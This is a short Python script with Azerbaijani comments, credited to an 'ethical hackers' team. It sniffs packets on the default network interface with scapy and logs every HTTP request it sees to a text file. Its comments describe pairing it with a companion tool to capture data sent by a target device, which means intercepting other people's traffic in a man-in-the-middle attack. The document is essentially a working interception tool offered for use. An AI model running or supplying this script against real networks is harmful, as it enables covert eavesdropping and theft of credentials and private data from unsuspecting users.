# Azərbaycan dilində intefeysi olan alət.
# Şəbəkəyə qoşulduğu interfeys üzərindən keçən informasiyanı oxuyur və log saxlayır.
# O.G.A aləti ilə birlikdə işlədikdə,
# hədəf qurğunun ötürdüyü məlumatları əldə etmək imkanı yaradır.
# Hazırladı Orxan Bayramov.
# Yazılım dili Python 3
# 2021-ci il https://www.kht.az
# !/usr/bin/env python

import subprocess
import scapy.all as scapy
from scapy.layers import http
import netifaces


def printbanner():
    subprocess.call(["clear"])
    print("██   ██ ██   ██  █████   ██████   █████  ███    ██    AZERBAIJAN")
    print("██  ██  ██   ██ ██   ██ ██       ██   ██ ████   ██      ETHICAL ")
    print("█████   ███████ ███████ ██   ███ ███████ ██ ██  ██      HACKERS ")
    print("██  ██  ██   ██ ██   ██ ██    ██ ██   ██ ██  ██ ██       TEAM")
    print("██   ██ ██   ██ ██   ██  ██████  ██   ██ ██   ████  https://kht.az\n")
    print("-- Ö t ü r ü l ə n    P a k e t l ə r i n    İ z l ə n m ə s i --")
    print("---------------------------------------------------------------------")
    print(" [+] Nəticəni saxlamaq və incələmək üçün CTRL + C düyməsi ilə çıxış edin!")


def get_interface():
    gw_device = netifaces.gateways()["default"]
    adapter = gw_device[netifaces.AF_INET][1]
    return adapter


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet)
        print(packet, file=open("pz_log.txt", "a"))


try:
    printbanner()
    sniff(get_interface())

finally:
    print("\n [+] CTRL + C .... Proses dayandırıldı!")
    print(" [+] Nəticə pz_log.txt faylına yazıldı!")
